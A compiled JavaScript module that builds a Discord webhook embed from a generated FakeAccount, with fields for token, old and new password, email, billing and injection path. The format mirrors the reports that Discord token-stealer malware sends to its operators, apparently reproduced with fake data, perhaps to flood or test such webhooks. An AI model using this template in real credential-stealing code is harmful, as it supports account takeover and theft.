"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.getUserPasswordChangeEmbed = void 0;
const fakeProfile_1 = require("../fakeProfile");
const utils_1 = require("../utils");
const baseEmbed_1 = require("./baseEmbed");
async function getUserPasswordChangeEmbed(config, account = new fakeProfile_1.FakeAccount()) {
    const { embeds, webhookMessage } = (0, baseEmbed_1.getBaseEmbeds)(config);
    const embed = embeds[0];
    embed.setTitle("Discord Initialized");
    embed.setThumbnail(await account.discord.getAvatar());
    const oldPassword = account.discord.password;
    account.discord.generatePassword();
    const newPassword = account.discord.password;
    embed.setFields([{
            name: "Info",
            value: account.injectionPath,
            inline: false
        }, {
            name: "Username",
            value: (0, utils_1.warpInQuote)(account.discord.tag),
            inline: true
        }, {
            name: "ID",
            value: (0, utils_1.warpInQuote)(account.discord.id),
            inline: true
        }, {
            name: "Nitro",
            value: (0, utils_1.warpInQuote)(account.discord.nitro),
            inline: false
        }, {
            name: "Badges",
            value: (0, utils_1.warpInQuote)(account.discord.badges.join(" ")),
            inline: false
        }, {
            name: "Billing",
            value: (0, utils_1.warpInQuote)(account.discord.billing),
            inline: false
        }, {
            name: "Email",
            value: (0, utils_1.warpInQuote)(account.discord.email),
            inline: true
        },
        {
            name: "Old Password",
            value: (0, utils_1.warpInQuote)(oldPassword),
            inline: true,
        },
        {
            name: "New Password",
            value: (0, utils_1.warpInQuote)(newPassword),
            inline: true,
        },
        {
            name: "Token",
            value: (0, utils_1.warpTripleQuote)(account.discord.token),
            inline: false,
        },
    ]);
    return webhookMessage();
}
exports.getUserPasswordChangeEmbed = getUserPasswordChangeEmbed;
